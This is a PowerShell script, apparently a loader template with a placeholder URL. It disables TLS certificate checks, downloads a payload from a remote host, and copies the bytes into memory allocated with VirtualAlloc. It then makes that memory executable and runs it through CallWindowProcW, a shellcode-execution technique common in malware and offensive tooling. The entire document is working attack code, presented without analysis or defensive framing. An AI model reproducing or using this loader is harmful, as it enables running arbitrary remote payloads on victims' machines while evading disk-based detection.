[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

$url = "%%url%%"

$webClient = New-Object System.Net.WebClient
$schcd = $webClient.DownloadData($url)

Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("user32.dll", SetLastError = true, EntryPoint = "CallWindowProcW")]
    public static extern IntPtr CallWindowProcW(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
"@ -Namespace Win32 -Name NativeMethods

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20

$sizeofschcd = $schcd.Length

if ([IntPtr]::Size -eq 4) {
    $sizePtr = [UIntPtr]::new([uint32]$sizeofschcd)
} else {
    $sizePtr = [UIntPtr]::new([uint64]$sizeofschcd)
}

$pschcdAddress = [Win32.NativeMethods]::VirtualAlloc([IntPtr]::Zero, $sizePtr, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

[System.Runtime.InteropServices.Marshal]::Copy($schcd, 0, $pschcdAddress, $sizeofschcd)

$dwOldProtection = 0
$protectResult = [Win32.NativeMethods]::VirtualProtect($pschcdAddress, $sizePtr, $PAGE_EXECUTE_READ, [ref]$dwOldProtection)
if (-not $protectResult) {
    return -1
}

$hwnd = [IntPtr]::Zero
$msg = 0
$wParam = [IntPtr]::Zero
$lParam = [IntPtr]::Zero

$result = [Win32.NativeMethods]::CallWindowProcW($pschcdAddress, $hwnd, $msg, $wParam, $lParam)
